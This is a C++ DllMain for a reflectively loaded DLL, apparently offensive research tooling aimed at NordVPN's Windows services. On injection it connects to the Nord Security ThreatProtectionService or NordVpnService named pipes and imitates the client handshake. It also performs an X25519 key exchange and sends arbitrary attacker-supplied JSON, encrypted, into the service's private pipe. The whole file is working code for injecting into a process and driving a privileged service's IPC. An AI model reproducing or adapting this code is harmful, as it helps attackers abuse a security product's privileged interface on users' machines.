#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN 
#endif

#include <Windows.h>

#include "Ipc.h"
#include "Crypto.h"
/* From Stephen Fewer (Converted to a static library)*/
#include "ReflectiveLoader.h"

const std::string TP_SERVICE_SERVER       = "\\\\.\\pipe\\nord-security\\v1\\ThreatProtectionService\\Server"; 
const std::string NORD_VPN_SERVICE_SERVER = "\\\\.\\pipe\\nord-security\\v1\\NordVpnService\\Server";

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    Console Con;
    Ipc Cli, Srv, Priv;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Con.write("[?]. Choose a pipe\r\n"\
                  "   [0]. %s\r\n"\
                  "   [1]. %s\r\n", 
                   TP_SERVICE_SERVER.c_str(), NORD_VPN_SERVICE_SERVER.c_str());
        {
            /* Selecting a pipe.*/
            int choosen = Con.read_int_range(0, 1);
            std::string cli_pipe = (choosen == 0) ? TP_SERVICE_SERVER : NORD_VPN_SERVICE_SERVER;
            Con.write("[+]. Choosen pipe %s\r\n", cli_pipe.c_str());

            /* connecting to cli pipe*/
            if (Cli.client(cli_pipe, GENERIC_READ | GENERIC_WRITE) != ERROR_SUCCESS) {
                Con.write("[!]. Connection to the pipe failed\r\n");
                return FALSE;
            }
            Con.write("[+]. Connected to the pipe\r\n"\
                      "     %s\r\n", cli_pipe.c_str());

            /* reading data from Cli.pipe*/
            binary_string ipc_client_msg;
            Con.write("[+]. Waiting for data\r\n");
            while (true) {
                size_t to_read = Cli.bytes_to_read();
                if (to_read > 0) {
                    ipc_client_msg = Cli.read<binary_string>(to_read);
                    Con.write("[+]. Received %d bytes from %s\r\n", ipc_client_msg.size(), cli_pipe.c_str());
                    break;
                }
            }

            std::string new_pipe = Cli.create_pipename(ipc_client_msg);
            Con.write("[+]. Received new named pipe name %s\r\n", new_pipe.c_str());

            /* create server*/
            Srv.server(new_pipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT);
            Sleep(500);

            /* sending "ack" to server */
            binary_string ipc_server_msg = Srv.create_public_msg<std::string>("\"ack\"");
            Srv.write(ipc_server_msg);

            /* our public key */
            Crypto Icrypto;
            std::string local_pub_key = encode_base64(Icrypto.pub_key());
            Con.write("[+]. Public key generated successfully (%s)\r\n",local_pub_key.c_str());

            /* sending our public key*/
            ipc_client_msg = Cli.create_public_msg<std::string>("{\"PublicKey\":\"" + local_pub_key + "\"}");
            Cli.write(ipc_client_msg);

            /* read data from Cli */
            std::string foreign_public_key;
            while (true) {
                size_t to_read = Cli.bytes_to_read();
                if (to_read > 0) {
                    ipc_client_msg = Cli.read<binary_string>(to_read);
                    foreign_public_key = Cli.get_public_key(ipc_client_msg);
                    new_pipe = Cli.create_pipename(ipc_client_msg);
                    Con.write("[+]. Recivied foreign public key and private pipe name\r\n"\
                              "     key:(%s)\r\n"\
                              "     pipe:(%s)\r\n", foreign_public_key.c_str(),new_pipe.c_str());
                    break;
                }
            }

            /* shared key && crypto*/
            binary_string shared_key = Icrypto.get_shared_key(decode_base64(foreign_public_key.c_str()));
            Con.write("[+]. Generating X25519 shared key\r\n"\
                "     key:(%s)\r\n", encode_base64(shared_key).c_str());

            for (int i = 0; i < MAX_ERROR; i++) {
                DWORD error_code = Priv.client(new_pipe, GENERIC_READ | GENERIC_WRITE);   //private pipe dziala
                if (error_code == NO_ERROR) {
                    Con.write("[+]. Connected to the private pipe %s\r\n", new_pipe.c_str());
                    break;
                }
                Sleep(200);
            }

            /* Read file path or pasted content */
            Con.write("[?]. Enter file path or paste JSON content\r\n");
            std::string json = Con.read_string();
            std::string content;

            /* "Check if input is JSON or a file path and prepare content */
            if (is_valid_file_path(json)) {
                content = read_file(json);
            }
            else {
                content = json;
            }

            Con.write("[+]. Encrypting content using shared key\r\n");

            //Con.write("CONTENT %s 0x%x\r\n", content.c_str(),content[1]);

            binary_string enc_content = Icrypto.encrypt(content,shared_key);

            /* add crypto msg header */
            enc_content = Priv.crypto_stream_header(enc_content);

            /* write encrypted content to the priv pipe*/
            size_t writed_bytes = Priv.write_crypto_stream(enc_content);

            Con.write("[+]. Sent %d of data to the private pipe\r\n", writed_bytes);
            
            /*read from priv pipe*/
            binary_string ipc_private_msg;
            while (true) {
                size_t to_read = Priv.bytes_to_read(); 
                if (to_read > 0) {
                    Con.write("[+]. Received %d bytes from the private pipe\r\n",to_read);
                    //...
                    break;
                }
            }
        }
        while (true);
        MessageBox(0, "Komuna", "Komuna", 0);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

